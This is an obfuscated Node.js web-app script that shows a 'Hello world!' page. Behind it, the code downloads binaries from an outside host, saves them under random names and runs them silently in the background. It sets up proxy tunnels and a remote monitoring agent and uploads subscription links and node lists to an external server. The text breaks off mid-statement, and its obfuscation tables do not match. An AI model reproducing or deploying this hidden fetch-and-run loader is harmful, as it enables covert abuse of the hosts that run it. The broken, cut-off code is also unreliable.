const _0x326c0e=_0x1034,_0x3ef2c6=_0x5564;(function(_0x2d6dec,_0x345006){const _0x1440b2=_0x1034,_0x4f0140=_0x5564,_0x42cf54=_0x2d6dec();while(!![]){try{const _0x165753=parseInt(_0x4f0140(0x164))/0x1*(-parseInt(_0x4f0140(0x21a))/0x2)+parseInt(_0x4f0140(0x1e6))/0x3*(-parseInt(_0x4f0140(0x1f7))/0x4)+-parseInt(_0x4f0140(0x1aa))/0x5+-parseInt(_0x4f0140(0x180))/0x6*(-parseInt(_0x4f0140(0x216))/0x7)+-parseInt(_0x4f0140(0x1f1))/0x8*(parseInt(_0x4f0140(0x1bb))/0x9)+-parseInt(_0x4f0140(0x176))/0xa+parseInt(_0x4f0140(0x1a9))/0xb;if(_0x165753===_0x345006)break;else _0x42cf54[_0x1440b2(0xef)](_0x42cf54[_0x1440b2(0x14b)]());}catch(_0x37c686){_0x42cf54[_0x1440b2(0xef)](_0x42cf54[_0x1440b2(0x14b)]());}}}(_0x50fb,0x77c74));const express=require(_0x3ef2c6(0x218)),app=express(),axios=require(_0x326c0e(0xc8)),os=require('os'),fs=require('fs'),path=require(_0x326c0e(0x14a)),{promisify}=require(_0x3ef2c6(0x199)),exec=promisify(require(_0x3ef2c6(0x1d3))[_0x326c0e(0x11b)]),{execSync}=require(_0x3ef2c6(0x1d3)),UPLOAD_URL=process[_0x326c0e(0xbf)][_0x326c0e(0x155)]||'',PROJECT_URL=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x1fc)]||'',AUTO_ACCESS=process[_0x326c0e(0xbf)][_0x326c0e(0x10b)]||![],FILE_PATH=process['env'][_0x3ef2c6(0x1cb)]||_0x3ef2c6(0x1b2),SUB_PATH=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x1c7)]||_0x3ef2c6(0x1fa),PORT=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x171)]||process[_0x3ef2c6(0x17f)][_0x326c0e(0x131)]||0xbb8,UUID=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x20f)]||_0x3ef2c6(0x19c),NEZHA_SERVER=process[_0x326c0e(0xbf)][_0x3ef2c6(0x1a4)]||'',NEZHA_PORT=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x225)]||'',NEZHA_KEY=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x203)]||'',ARGO_DOMAIN=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x1d7)]||'',ARGO_AUTH=process[_0x3ef2c6(0x17f)][_0x326c0e(0x145)]||'',ARGO_PORT=process[_0x3ef2c6(0x17f)]['ARGO_PORT']||0x1f41,CFIP=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x1f2)]||_0x3ef2c6(0x19e),CFPORT=process[_0x3ef2c6(0x17f)][_0x3ef2c6(0x209)]||0x1bb,NAME=process[_0x326c0e(0xbf)][_0x3ef2c6(0x1eb)]||_0x326c0e(0x11d);!fs[_0x3ef2c6(0x20b)](FILE_PATH)?(fs[_0x3ef2c6(0x21e)](FILE_PATH),console[_0x3ef2c6(0x1d1)](FILE_PATH+_0x3ef2c6(0x204))):console[_0x3ef2c6(0x1d1)](FILE_PATH+_0x326c0e(0xfd));function generateRandomName(){const _0xee1a90=_0x3ef2c6,_0x2e0e37=_0xee1a90(0x16f);let _0x2932a6='';for(let _0x136702=0x0;_0x136702<0x6;_0x136702++){_0x2932a6+=_0x2e0e37[_0xee1a90(0x167)](Math[_0xee1a90(0x16b)](Math[_0xee1a90(0x17d)]()*_0x2e0e37[_0xee1a90(0x1c6)]));}return _0x2932a6;}function _0x25d8(){const _0x476217=['send','env','forEach','true','config.json','http\x20server\x20is\x20running\x20on\x20port:','/api/add-subscriptions','tunnel.json','text/plain;\x20charset=utf-8','close','axios','/vmess-argo?ed=2560','clear','automatic\x20access\x20task\x20added\x20successfully','\x20-c\x20','2053','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','1632834BmDlVy','NEZHA_KEY','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,skip\x20running','https+local://8.8.8.8/dns-query','xtls-rprx-vision','Unhandled\x20error\x20in\x20startserver:','nohup\x20','platform','https://amd64.ssss.nyc.mn/web','17931GxbRwL','response','/api/add-nodes','2861525caIlsm','1230VaOASp','NEZHA_PORT','vmess','https://arm64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','trojan','writeFileSync','del\x20/f\x20/q\x20','error','\x20is\x20created','Download\x20','https://arm64.ssss.nyc.mn/bot','split','org','Error\x20downloading\x20files:','toString','push','country_code','arch','Unknown','tls','random','from','Hello\x20world!','stream','127.0.0.1','http','quic','Error\x20in\x20startserver:','substring','\x20already\x20exists','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','statSync','pipe','16GRRZND','base64','--tls','charAt','post','rm\x20-rf\x20','\x22\x20>\x20/dev/null\x202>&1','match','message','\x20successfully','AUTO_ACCESS','/trojan-argo','Empowerment\x20failed\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','win32','http://ip-api.com/json/','&fp=firefox&type=ws&host=','taskkill\x20/f\x20/im\x20','vless','1HkaepJ','map','firefox','unshift','catch','\x20-s\x20','php\x20running\x20error:\x20','exec','floor','郑先生','application/json','unlinkSync','listen','data','\x20>/dev/null\x202>&1\x20&','finish','stringify','set','\x0a\x0atrojan://','2083','Nodes\x20uploaded\x20successfully','https://ipapi.co/json/','443','&path=%2Fvless-argo%3Fed%3D2560#','Skipping\x20adding\x20automatic\x20access\x20task','SERVER_PORT','FILE_PATH','log','success','PORT','amd','ARGO_DOMAIN:','arm','tunnel.yml','CFPORT','child_process','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-c\x20\x22','utf-8','\x20>\x20nul\x202>&1','pkill\x20-f\x20\x22[','\x20is\x20running','existsSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','includes','\x0a\x20\x20\x20\x20','list.txt','/vmess-argo','isFile','ARGO_AUTH','none','chmod','get','8443','path','shift','NEZHA_SERVER','createWriteStream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','then','\x20>/dev/null\x202>&1','957004shNedy','boot.log','filter','UPLOAD_URL','Subscription\x20uploaded\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','cdns.doon.eu.org','all','abcdefghijklmnopqrstuvwxyz','App\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','test','express','ArgoDomain:','aarch64','1029','Empowerment\x20success\x20for\x20','https://arm64.ssss.nyc.mn/agent','fileUrl','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','?security=tls&sni=','countryCode','Error\x20executing\x20command:\x20','tcp','\x20failed:\x20','Error\x20reading\x20boot.log:','sub.txt','length','\x0a\x0avmess://','mkdirSync','join','web\x20running\x20error:\x20','\x0a\x20\x20tunnel:\x20','/api/delete-nodes','Content-Type','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arm64','?encryption=none&security=tls&sni=','ARGO_DOMAIN'];_0x25d8=function(){return _0x476217;};return _0x25d8();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3ef2c6(0x200)](FILE_PATH,npmName),phpPath=path[_0x326c0e(0x173)](FILE_PATH,phpName),webPath=path[_0x3ef2c6(0x200)](FILE_PATH,webName),botPath=path[_0x3ef2c6(0x200)](FILE_PATH,botName),subPath=path[_0x326c0e(0x173)](FILE_PATH,_0x3ef2c6(0x175)),listPath=path[_0x3ef2c6(0x200)](FILE_PATH,_0x3ef2c6(0x1ae)),bootLogPath=path['join'](FILE_PATH,_0x3ef2c6(0x1f5)),configPath=path[_0x3ef2c6(0x200)](FILE_PATH,_0x3ef2c6(0x197));function deleteNodes(){const _0x5158c1=_0x326c0e,_0x2d5d5e=_0x3ef2c6;try{if(!UPLOAD_URL)return;if(!fs[_0x2d5d5e(0x20b)](subPath))return;let _0xae8a32;try{_0xae8a32=fs[_0x2d5d5e(0x18f)](subPath,_0x2d5d5e(0x1a7));}catch{return null;}const _0xe0fc3e=Buffer[_0x2d5d5e(0x1ad)](_0xae8a32,_0x2d5d5e(0x201))[_0x2d5d5e(0x1ab)](_0x5158c1(0x13a)),_0x4618b4=_0xe0fc3e[_0x5158c1(0xeb)]('\x0a')[_0x2d5d5e(0x212)](_0x348b5f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d5d5e(0x18b)](_0x348b5f));if(_0x4618b4[_0x5158c1(0x170)]===0x0)return;return axios[_0x2d5d5e(0x186)](UPLOAD_URL+_0x5158c1(0x176),JSON[_0x2d5d5e(0x1c8)]({'nodes':_0x4618b4}),{'headers':{'Content-Type':_0x2d5d5e(0x1b6)}})[_0x2d5d5e(0x1e5)](_0x6d3034=>{return null;}),null;}catch(_0x45ae9b){return null;}}function _0x5564(_0x4df125,_0x240bdf){_0x4df125=_0x4df125-0x164;const _0x4bc1ad=_0x50fb();let _0x43d14b=_0x4bc1ad[_0x4df125];return _0x43d14b;}function cleanupOldFiles(){const _0x50754f=_0x3ef2c6;try{const _0x1cfc71=fs[_0x50754f(0x1f9)](FILE_PATH);_0x1cfc71[_0x50754f(0x1a0)](_0x30efd7=>{const _0xd46c76=_0x50754f,_0x46dbf4=path[_0xd46c76(0x200)](FILE_PATH,_0x30efd7);try{const _0x22f7fe=fs[_0xd46c76(0x206)](_0x46dbf4);_0x22f7fe[_0xd46c76(0x1ac)]()&&fs[_0xd46c76(0x210)](_0x46dbf4);}catch(_0x520360){}});}catch(_0x5d2fd2){}}app[_0x3ef2c6(0x165)]('/',function(_0x386ac5,_0x52f72d){const _0x3cce64=_0x3ef2c6;_0x52f72d[_0x3cce64(0x1be)](_0x3cce64(0x1bd));});async function generateConfig(){const _0x52b256=_0x326c0e,_0x5a8d3a=_0x3ef2c6,_0x594571={'log':{'access':_0x5a8d3a(0x168),'error':_0x5a8d3a(0x168),'loglevel':_0x5a8d3a(0x1d6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x52b256(0x113),'settings':{'clients':[{'id':UUID,'flow':_0x52b256(0xd6)}],'decryption':_0x5a8d3a(0x1d6),'fallbacks':[{'dest':0xbb9},{'path':_0x5a8d3a(0x1e4),'dest':0xbba},{'path':_0x5a8d3a(0x1a6),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5a8d3a(0x17a)}},{'port':0xbb9,'listen':_0x5a8d3a(0x205),'protocol':_0x5a8d3a(0x1c0),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a8d3a(0x1d6)},'streamSettings':{'network':_0x52b256(0x16c),'security':_0x5a8d3a(0x1d6)}},{'port':0xbba,'listen':_0x5a8d3a(0x205),'protocol':_0x5a8d3a(0x1c0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a8d3a(0x1d6)},'streamSettings':{'network':'ws','security':_0x5a8d3a(0x1d6),'wsSettings':{'path':_0x5a8d3a(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a8d3a(0x1e1),_0x5a8d3a(0x16d),_0x5a8d3a(0x207)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5a8d3a(0x205),'protocol':_0x5a8d3a(0x18c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5a8d3a(0x1a6)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a8d3a(0x1e1),_0x5a8d3a(0x16d),_0x5a8d3a(0x207)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a8d3a(0x205),'protocol':_0x5a8d3a(0x18e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5a8d3a(0x1d6),'wsSettings':{'path':_0x52b256(0x10c)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a8d3a(0x1e1),_0x5a8d3a(0x16d),_0x5a8d3a(0x207)],'metadataOnly':![]}}],'dns':{'servers':[_0x5a8d3a(0x202)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x5a8d3a(0x1b8),'tag':_0x5a8d3a(0x173)}]};fs[_0x5a8d3a(0x1c2)](path[_0x5a8d3a(0x200)](FILE_PATH,_0x52b256(0xc2)),JSON[_0x52b256(0x124)](_0x594571,null,0x2));}function getSystemArchitecture(){const _0x4bb358=_0x326c0e,_0x4480c9=_0x3ef2c6,_0x3e9452=os[_0x4bb358(0xf1)]();return _0x3e9452===_0x4480c9(0x193)||_0x3e9452===_0x4480c9(0x174)||_0x3e9452===_0x4bb358(0x160)?_0x4480c9(0x193):_0x4bb358(0x132);}function downloadFile(_0x722d66,_0x268e53,_0x1a81a8){const _0x21fbcf=_0x3ef2c6,_0x28876c=_0x722d66;!fs[_0x21fbcf(0x20b)](FILE_PATH)&&fs[_0x21fbcf(0x21e)](FILE_PATH,{'recursive':!![]});const _0x9ae98d=fs[_0x21fbcf(0x172)](_0x28876c);axios({'method':'get','url':_0x268e53,'responseType':_0x21fbcf(0x1ec)})[_0x21fbcf(0x17b)](_0x3f37ca=>{const _0x4dfbcb=_0x1034,_0x115d02=_0x21fbcf;_0x3f37ca[_0x115d02(0x1b0)][_0x115d02(0x224)](_0x9ae98d),_0x9ae98d['on'](_0x4dfbcb(0x123),()=>{const _0xbd9e8b=_0x115d02;_0x9ae98d[_0xbd9e8b(0x198)](),console[_0xbd9e8b(0x1d1)](_0xbd9e8b(0x20a)+path[_0xbd9e8b(0x1dc)](_0x28876c)+_0xbd9e8b(0x213)),_0x1a81a8(null,_0x28876c);}),_0x9ae98d['on'](_0x4dfbcb(0xe7),_0x2c2166=>{const _0x815b0b=_0x4dfbcb,_0x3151a9=_0x115d02;fs[_0x3151a9(0x1c3)](_0x28876c,()=>{});const _0xeb6d0c=_0x3151a9(0x20a)+path[_0x3151a9(0x1dc)](_0x28876c)+_0x3151a9(0x1c5)+_0x2c2166[_0x3151a9(0x1de)];console[_0x815b0b(0xe7)](_0xeb6d0c),_0x1a81a8(_0xeb6d0c);});})[_0x21fbcf(0x1e5)](_0x324547=>{const _0x4d3f7d=_0x1034,_0x3c23a6=_0x21fbcf,_0x2d32f6=_0x4d3f7d(0xe9)+path[_0x3c23a6(0x1dc)](_0x28876c)+_0x3c23a6(0x1c5)+_0x324547[_0x3c23a6(0x1de)];console[_0x3c23a6(0x169)](_0x2d32f6),_0x1a81a8(_0x2d32f6);});}async function downloadFilesAndRun(){const _0x4f083b=_0x326c0e,_0x58bc12=_0x3ef2c6,_0x28745a=getSystemArchitecture(),_0x4051a1=getFilesForArchitecture(_0x28745a);if(_0x4051a1[_0x58bc12(0x1c6)]===0x0){console[_0x58bc12(0x1d1)](_0x58bc12(0x208));return;}const _0x3cc57e=_0x4051a1[_0x4f083b(0x115)](_0x708ff9=>{return new Promise((_0x3a2a11,_0x2f7e38)=>{const _0x3510c1=_0x5564;downloadFile(_0x708ff9[_0x3510c1(0x178)],_0x708ff9[_0x3510c1(0x190)],(_0x5a77fb,_0x475e63)=>{_0x5a77fb?_0x2f7e38(_0x5a77fb):_0x3a2a11(_0x475e63);});});});try{await Promise[_0x58bc12(0x1db)](_0x3cc57e);}catch(_0x465bba){console[_0x58bc12(0x169)](_0x58bc12(0x214),_0x465bba);return;}function _0x30dd7a(_0x4514c7){const _0x55c7c1=0x1fd;_0x4514c7['forEach'](_0x59c448=>{const _0x2ce4ee=_0x1034,_0x167b26=_0x5564;fs[_0x2ce4ee(0x13e)](_0x59c448)&&fs[_0x167b26(0x1d8)](_0x59c448,_0x55c7c1,_0x1e4ef0=>{const _0x5cfef6=_0x167b26;_0x1e4ef0?console[_0x5cfef6(0x169)](_0x5cfef6(0x20d)+_0x59c448+':\x20'+_0x1e4ef0):console[_0x5cfef6(0x1d1)](_0x5cfef6(0x179)+_0x59c448+':\x20'+_0x55c7c1[_0x5cfef6(0x1ab)](0x8));});});}const _0x287da8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x30dd7a(_0x287da8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x15ed45=NEZHA_SERVER[_0x58bc12(0x1bf)](':')?NEZHA_SERVER[_0x58bc12(0x187)](':')[_0x58bc12(0x19a)]():'',_0x5cb6b6=new Set([_0x58bc12(0x1a2),'8443',_0x58bc12(0x1fd),_0x58bc12(0x221),_0x58bc12(0x183),_0x58bc12(0x19d)]),_0x6c33b5=_0x5cb6b6['has'](_0x15ed45)?_0x58bc12(0x21c):'false',_0x3323ff=_0x58bc12(0x1e9)+NEZHA_KEY+_0x58bc12(0x1d4)+NEZHA_SERVER+_0x4f083b(0x168)+_0x6c33b5+_0x58bc12(0x1b4)+UUID;fs[_0x58bc12(0x1c2)](path[_0x58bc12(0x200)](FILE_PATH,_0x58bc12(0x20c)),_0x3323ff);const _0x56eaf5=_0x58bc12(0x188)+phpPath+_0x4f083b(0x139)+FILE_PATH+_0x58bc12(0x1ee);try{await exec(_0x56eaf5),console[_0x58bc12(0x1d1)](phpName+_0x58bc12(0x170)),await new Promise(_0x7118db=>setTimeout(_0x7118db,0x3e8));}catch(_0x2fb8a5){console[_0x58bc12(0x169)](_0x4f083b(0x11a)+_0x2fb8a5);}}else{let _0x44b119='';const _0x5362a0=['443',_0x58bc12(0x222),_0x58bc12(0x1fd),_0x58bc12(0x221),_0x4f083b(0x127),'2053'];_0x5362a0[_0x58bc12(0x1bf)](NEZHA_PORT)&&(_0x44b119=_0x58bc12(0x1fb));const _0x310927=_0x4f083b(0xd8)+npmPath+_0x58bc12(0x1ca)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x44b119+_0x58bc12(0x184);try{await exec(_0x310927),console[_0x4f083b(0x12f)](npmName+_0x58bc12(0x170)),await new Promise(_0x109fcd=>setTimeout(_0x109fcd,0x3e8));}catch(_0x40d539){console[_0x58bc12(0x169)](_0x58bc12(0x181)+_0x40d539);}}}else console[_0x58bc12(0x1d1)](_0x58bc12(0x1df));const _0x391908=_0x4f083b(0xd8)+webPath+_0x58bc12(0x1fe)+FILE_PATH+_0x58bc12(0x1da);try{await exec(_0x391908),console[_0x58bc12(0x1d1)](webName+_0x58bc12(0x170)),await new Promise(_0xad6f51=>setTimeout(_0xad6f51,0x3e8));}catch(_0x24a57a){console[_0x58bc12(0x169)](_0x58bc12(0x19f)+_0x24a57a);}if(fs[_0x4f083b(0x13e)](botPath)){let _0x5a9fd8;if(ARGO_AUTH[_0x4f083b(0x108)](/^[A-Z0-9a-z=]{120,250}$/))_0x5a9fd8=_0x4f083b(0x138)+ARGO_AUTH;else ARGO_AUTH[_0x4f083b(0x108)](/TunnelSecret/)?_0x5a9fd8=_0x58bc12(0x211)+FILE_PATH+_0x58bc12(0x191):_0x5a9fd8=_0x58bc12(0x192)+FILE_PATH+_0x4f083b(0xcf)+ARGO_PORT;try{await exec(_0x58bc12(0x188)+botPath+'\x20'+_0x5a9fd8+_0x58bc12(0x18a)),console[_0x58bc12(0x1d1)](botName+_0x58bc12(0x170)),await new Promise(_0x34b9f6=>setTimeout(_0x34b9f6,0x7d0));}catch(_0x190528){console[_0x58bc12(0x169)](_0x58bc12(0x1e8)+_0x190528);}}await new Promise(_0x1d8adb=>setTimeout(_0x1d8adb,0x1388));}function getFilesForArchitecture(_0x375cac){const _0x5cd1d7=_0x326c0e,_0x4ffe3c=_0x3ef2c6;let _0x504f27;_0x375cac===_0x4ffe3c(0x193)?_0x504f27=[{'fileName':webPath,'fileUrl':_0x5cd1d7(0xe2)},{'fileName':botPath,'fileUrl':_0x4ffe3c(0x1af)}]:_0x504f27=[{'fileName':webPath,'fileUrl':_0x4ffe3c(0x1cc)},{'fileName':botPath,'fileUrl':_0x4ffe3c(0x1f0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x50a7e9=_0x375cac===_0x4ffe3c(0x193)?_0x5cd1d7(0x163):_0x4ffe3c(0x18d);_0x504f27[_0x4ffe3c(0x1d2)]({'fileName':npmPath,'fileUrl':_0x50a7e9});}else{const _0xb069f0=_0x375cac===_0x4ffe3c(0x193)?_0x4ffe3c(0x16e):_0x5cd1d7(0x167);_0x504f27[_0x5cd1d7(0x117)]({'fileName':phpPath,'fileUrl':_0xb069f0});}}return _0x504f27;}function argoType(){const _0xf6cb50=_0x326c0e,_0x3af3b3=_0x3ef2c6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3af3b3(0x1d1)](_0x3af3b3(0x1ff));return;}if(ARGO_AUTH[_0xf6cb50(0x140)](_0x3af3b3(0x1a5))){fs[_0x3af3b3(0x1c2)](path[_0x3af3b3(0x200)](FILE_PATH,_0x3af3b3(0x1b9)),ARGO_AUTH);const _0x5cbf20=_0x3af3b3(0x219)+ARGO_AUTH[_0x3af3b3(0x187)]('\x22')[0xb]+_0x3af3b3(0x1c9)+path[_0x3af3b3(0x200)](FILE_PATH,_0x3af3b3(0x1b9))+_0xf6cb50(0x165)+ARGO_DOMAIN+_0x3af3b3(0x1f8)+ARGO_PORT+_0x3af3b3(0x21d);fs[_0xf6cb50(0xe5)](path[_0x3af3b3(0x200)](FILE_PATH,_0x3af3b3(0x215)),_0x5cbf20);}else console[_0x3af3b3(0x1d1)](_0x3af3b3(0x1a1));}async function extractDomains(){const _0x583b98=_0x326c0e,_0x467dc5=_0x3ef2c6;let _0xff3f41;if(ARGO_AUTH&&ARGO_DOMAIN)_0xff3f41=ARGO_DOMAIN,console[_0x467dc5(0x1d1)](_0x467dc5(0x17e),_0xff3f41),await _0x466206(_0xff3f41);else try{const _0x30f1de=fs[_0x467dc5(0x18f)](path[_0x467dc5(0x200)](FILE_PATH,_0x583b98(0x153)),'utf-8'),_0x235ebe=_0x30f1de[_0x467dc5(0x187)]('\x0a'),_0x3541bd=[];_0x235ebe[_0x583b98(0xc0)](_0x4f738f=>{const _0x183832=_0x583b98,_0x4205a7=_0x467dc5,_0x17de97=_0x4f738f[_0x4205a7(0x1c1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x17de97){const _0x24853f=_0x17de97[0x1];_0x3541bd[_0x183832(0xef)](_0x24853f);}});if(_0x3541bd[_0x467dc5(0x1c6)]>0x0)_0xff3f41=_0x3541bd[0x0],console[_0x583b98(0x12f)](_0x467dc5(0x1d0),_0xff3f41),await _0x466206(_0xff3f41);else{console[_0x467dc5(0x1d1)](_0x467dc5(0x16c)),fs[_0x583b98(0x11f)](path[_0x467dc5(0x200)](FILE_PATH,_0x467dc5(0x1f5)));async function _0x4c24f3(){const _0x59df01=_0x583b98,_0x30f2f8=_0x467dc5;try{process[_0x30f2f8(0x194)]===_0x30f2f8(0x1ed)?await exec(_0x59df01(0x112)+botName+_0x30f2f8(0x1f4)):await exec(_0x30f2f8(0x189)+botName[_0x30f2f8(0x167)](0x0)+']'+botName[_0x30f2f8(0x182)](0x1)+_0x59df01(0x107));}catch(_0x29959a){}}_0x4c24f3(),await new Promise(_0x5c6d0c=>setTimeout(_0x5c6d0c,0xbb8));const _0x5e55eb=_0x467dc5(0x192)+FILE_PATH+_0x583b98(0xcf)+ARGO_PORT;try{await exec(_0x583b98(0xd8)+botPath+'\x20'+_0x5e55eb+_0x467dc5(0x18a)),console[_0x467dc5(0x1d1)](botName+_0x467dc5(0x170)),await new Promise(_0x115d93=>setTimeout(_0x115d93,0xbb8)),await extractDomains();}catch(_0x51c52e){console[_0x467dc5(0x169)](_0x583b98(0x16b)+_0x51c52e);}}}catch(_0x218023){console[_0x467dc5(0x169)](_0x583b98(0x16e),_0x218023);}async function _0x1c7bcf(){const _0x26ab4d=_0x583b98,_0x1a996d=_0x467dc5;try{const _0xb6dab9=await axios[_0x1a996d(0x165)](_0x1a996d(0x21b),{'timeout':0xbb8});if(_0xb6dab9[_0x1a996d(0x1b0)]&&_0xb6dab9['data'][_0x26ab4d(0xf0)]&&_0xb6dab9[_0x1a996d(0x1b0)][_0x1a996d(0x1dd)])return _0xb6dab9[_0x1a996d(0x1b0)][_0x1a996d(0x1bc)]+'_'+_0xb6dab9[_0x1a996d(0x1b0)][_0x1a996d(0x1dd)];}catch(_0x211354){try{const _0xf04739=await axios[_0x1a996d(0x165)](_0x1a996d(0x1e0),{'timeout':0xbb8});if(_0xf04739[_0x1a996d(0x1b0)]&&_0xf04739[_0x26ab4d(0x121)][_0x1a996d(0x220)]===_0x1a996d(0x1e2)&&_0xf04739[_0x1a996d(0x1b0)]['countryCode']&&_0xf04739[_0x26ab4d(0x121)][_0x1a996d(0x1dd)])return _0xf04739['data'][_0x1a996d(0x185)]+'_'+_0xf04739[_0x26ab4d(0x121)][_0x26ab4d(0xec)];}catch(_0x437a90){}}return _0x1a996d(0x1b7);}async function _0x466206(_0x19cb05){const _0x34e745=await _0x1c7bcf(),_0x5800c7=NAME?NAME+'-'+_0x34e745:_0x34e745;return new Promise(_0x38b224=>{setTimeout(()=>{const _0xd90187=_0x1034,_0x40323f=_0x5564,_0x4c3438={'v':'2','ps':''+_0x5800c7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xd90187(0x146),'net':'ws','type':_0x40323f(0x1d6),'host':_0x19cb05,'path':_0x40323f(0x1ba),'tls':_0xd90187(0xf3),'sni':_0x19cb05,'alpn':'','fp':_0x40323f(0x1a8)},_0x19ffc6=_0x40323f(0x1d9)+UUID+'@'+CFIP+':'+CFPORT+_0x40323f(0x16a)+_0x19cb05+_0xd90187(0x111)+_0x19cb05+_0x40323f(0x1b1)+_0x5800c7+_0xd90187(0x171)+Buffer[_0x40323f(0x1ad)](JSON[_0x40323f(0x1c8)](_0x4c3438))[_0xd90187(0xee)]('base64')+_0xd90187(0x126)+UUID+'@'+CFIP+':'+CFPORT+_0x40323f(0x1b3)+_0x19cb05+_0x40323f(0x1e3)+_0x19cb05+_0x40323f(0x20e)+_0x5800c7+_0xd90187(0x141);console['log'](Buffer[_0x40323f(0x1ad)](_0x19ffc6)[_0x40323f(0x1ab)](_0x40323f(0x201))),fs[_0xd90187(0xe5)](subPath,Buffer[_0x40323f(0x1ad)](_0x19ffc6)[_0x40323f(0x1ab)](_0x40323f(0x201))),console[_0x40323f(0x1d1)](FILE_PATH+_0x40323f(0x1ef)),uploadNodes(),app[_0x40323f(0x165)]('/'+SUB_PATH,(_0x3a7b63,_0x1e8942)=>{const _0x547a6d=_0xd90187,_0x5b63df=_0x40323f,_0x121565=Buffer[_0x5b63df(0x1ad)](_0x19ffc6)[_0x5b63df(0x1ab)](_0x5b63df(0x201));_0x1e8942[_0x5b63df(0x1b5)](_0x547a6d(0x177),_0x5b63df(0x1f6)),_0x1e8942[_0x547a6d(0xbe)](_0x121565);}),_0x38b224(_0x19ffc6);},0x7d0);});}}async function uploadNodes(){const _0x485654=_0x326c0e,_0x1f95bb=_0x3ef2c6;if(UPLOAD_URL&&PROJECT_URL){const _0x4fcd71=PROJECT_URL+'/'+SUB_PATH,_0x3c812c={'subscription':[_0x4fcd71]};try{const _0x5c8087=await axios[_0x1f95bb(0x186)](UPLOAD_URL+_0x1f95bb(0x19b),_0x3c812c,{'headers':{'Content-Type':_0x1f95bb(0x1b6)}});return _0x5c8087&&_0x5c8087[_0x1f95bb(0x220)]===0xc8?(console[_0x1f95bb(0x1d1)](_0x1f95bb(0x1f3)),_0x5c8087):null;}catch(_0x43f8fa){if(_0x43f8fa[_0x1f95bb(0x195)]){if(_0x43f8fa[_0x485654(0xdc)][_0x1f95bb(0x220)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x485654(0x13e)](listPath))return;const _0x591f3b=fs[_0x1f95bb(0x18f)](listPath,_0x1f95bb(0x1a7)),_0x1544d1=_0x591f3b[_0x485654(0xeb)]('\x0a')[_0x1f95bb(0x212)](_0x5400cd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1f95bb(0x18b)](_0x5400cd));if(_0x1544d1[_0x1f95bb(0x1c6)]===0x0)return;const _0x41f82d=JSON[_0x1f95bb(0x1c8)]({'nodes':_0x1544d1});try{const _0x77c5b0=await axios['post'](UPLOAD_URL+_0x1f95bb(0x17c),_0x41f82d,{'headers':{'Content-Type':_0x1f95bb(0x1b6)}});return _0x77c5b0&&_0x77c5b0[_0x1f95bb(0x220)]===0xc8?(console[_0x1f95bb(0x1d1)](_0x485654(0x128)),_0x77c5b0):null;}catch(_0x5e9757){return null;}}else return;}}function _0x50fb(){const 